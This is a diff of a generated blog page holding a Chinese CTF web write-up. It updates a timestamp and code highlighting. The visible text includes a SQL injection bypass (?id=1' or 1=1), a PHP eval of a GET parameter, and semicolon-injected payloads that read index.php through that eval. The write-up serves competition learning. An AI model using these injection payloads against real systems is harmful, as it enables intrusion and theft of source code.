@@ -89,7 +89,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/1.png">
 <meta property="og:image" content="http://yoursite.com/2019/08/29/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4/2.png">
-<meta property="og:updated_time" content="2019-08-29T04:25:29.598Z">
+<meta property="og:updated_time" content="2019-09-21T05:23:00.307Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="第五空间-Web WP">
 <meta name="twitter:description" content="空相 一道签到题，提示参数是id  尝试?id=1为禁止进入2为text   ?id=1’ or 1=1 绕过   给出flag的php文件，提交token得到flag 八苦（三道web题中唯一正常一点的） （环境关了，早上做出来的题，记不太清了，记错了也，，2333333） 进入靶机，发现只有一个welcome，啥也没有。各种备份泄露试一波，最后发现是phps 然后得到源码（user类当时觉得没">
@@ -366,12 +366,12 @@
 <p>又没有改属性，所以调用__get()方法</p>
 <p>返回1（我们之前构造的键值对中的值）</p>
 <p>然后通过判断，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">'$a='</span>.$_GET[<span class="string">'dangerous'</span>].<span class="string">';'</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
 
 <p>这里利用  ;  截断，</p>
 <p>使得eval执行不止一个函数</p>
 <p>然后翻出之前收藏的读文件一把梭，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;$fp = fopen(<span class="string">"./index.php"</span>,<span class="string">"r"</span>);$str = fread($fp,filesize(<span class="string">"./index.php"</span>));<span class="keyword">echo</span> $str = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,$str);</span><br><span class="line"><span class="number">1</span>;<span class="keyword">echo</span> readfile(<span class="string">"./index.php"</span>);</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1;<span class="variable">$fp</span> = fopen(<span class="string">"./index.php"</span>,<span class="string">"r"</span>);<span class="variable">$str</span> = fread(<span class="variable">$fp</span>,filesize(<span class="string">"./index.php"</span>));<span class="built_in">echo</span> <span class="variable">$str</span> = str_replace(<span class="string">"\r\n"</span>,<span class="string">"&lt;br /&gt;"</span>,<span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line">1;<span class="built_in">echo</span> readfile(<span class="string">"./index.php"</span>);</span><br></pre></td></tr></table></figure>
 
 <p>(忘记当时用的哪个了)</p>
 <p>发现成功</p>
